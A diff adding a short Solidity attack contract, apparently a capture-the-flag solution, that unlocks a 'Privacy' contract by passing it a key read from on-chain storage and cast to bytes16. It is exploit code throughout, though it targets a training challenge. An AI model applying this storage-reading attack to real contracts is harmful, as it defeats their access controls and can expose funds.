@@ -1,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0; 
+import "./Privacy.sol";
+
+contract AttackPrivacy {
+    Privacy public victim;
+    constructor (address _victim) {
+        victim = Privacy(_victim);
+    }
+
+    function attack(bytes32 slot) public {
+        bytes16 _key = bytes16(slot);
+        victim.unlock(_key);
+    }
+}
